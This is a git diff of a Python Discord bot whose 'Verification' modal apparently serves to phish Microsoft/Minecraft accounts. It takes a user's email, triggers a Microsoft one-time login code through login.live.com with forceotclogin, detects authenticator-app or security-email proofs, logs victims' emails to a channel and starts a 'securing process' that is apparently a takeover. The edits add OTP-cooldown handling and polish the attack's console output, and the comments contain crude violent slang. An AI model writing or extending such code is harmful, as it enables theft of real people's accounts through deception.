@@ -30,12 +30,6 @@ class MyModalOne(ui.Modal, title="Verification"):
 
         logs_channel = await interaction.client.fetch_channel(config["discord"]["logs_channel"])
 
-        # That bum really left encrypted text here as a watermark LOL
-
-        # Check if Minecraft Username is valid
-        # response = requests.get(f"https://api.mojang.com/users/profiles/minecraft/{self.username.value}")
-        # To be implemented or scraped 
-
         await interaction.response.defer()
 
         await interaction.followup.send(
@@ -48,7 +42,7 @@ class MyModalOne(ui.Modal, title="Verification"):
         )
 
         # Sends OTP/Auth code
-        # forceotclogin is what triggers the code, spamming otps may lead to microsoft raping the email for some time 
+        # forceotclogin is what triggers the code, spamming otps may lead to <line 96> responses
         emailInfo = requests.get(
             url = "https://login.live.com/GetCredentialType.srf",
             headers = {
@@ -82,7 +76,7 @@ class MyModalOne(ui.Modal, title="Verification"):
                     )
                 )
 
-            await interaction.followup.send(
+            await interaction.response.send_message(
                 embed = discord.Embed(
                     title = embeds["failed_otp"][0],
                     description = embeds["failed_otp"][1],
@@ -92,11 +86,33 @@ class MyModalOne(ui.Modal, title="Verification"):
             )
 
             return
+        
+        # Microsoft raping otp requests
+        # Can be fixed since the latest otp sent still works
+        # To be coded later
+        if "Error" in emailInfo:
+            await logs_channel.send(
+                    embed = discord.Embed(
+                        title = f"{interaction.user.name} ({interaction.user.id})",
+                        description = f"Failed to send a code to:\n```{self.email.value}```\nOTP Cooldown"
+                    )
+                )
+
+            await interaction.response.send_message(
+                embed = discord.Embed(
+                    title = embeds["cooldown_otp"][0],
+                    description = embeds["cooldown_otp"][1],
+                ),
+                ephemeral = True
+            )
+
+            return
+
 
         # Entropy = Authenticator App number to click in  
         if "RemoteNgcParams" in emailInfo["Credentials"]:
-
-            print("Found Authenticator App!")
+            print("\n| Starting securing process |\n")
+            print("[+] - Found Authenticator App")
             device = emailInfo["Credentials"]["RemoteNgcParams"]["SessionIdentifier"]
 
             if "Entropy" not in emailInfo["Credentials"]["RemoteNgcParams"]:
@@ -218,8 +234,9 @@ class MyModalOne(ui.Modal, title="Verification"):
             return
 
         elif "OtcLoginEligibleProofs" in emailInfo["Credentials"]:
+            print("\n| Starting securing process |\n")
             secEmail = emailInfo["Credentials"]["OtcLoginEligibleProofs"][0]
-            print(f"Found security email: {secEmail["display"]}!")
+            print(f"[+] - Found security email: {secEmail["display"]}")
 
             # Will be replace with a db in later updates
             with open("data.json", "w+") as f:
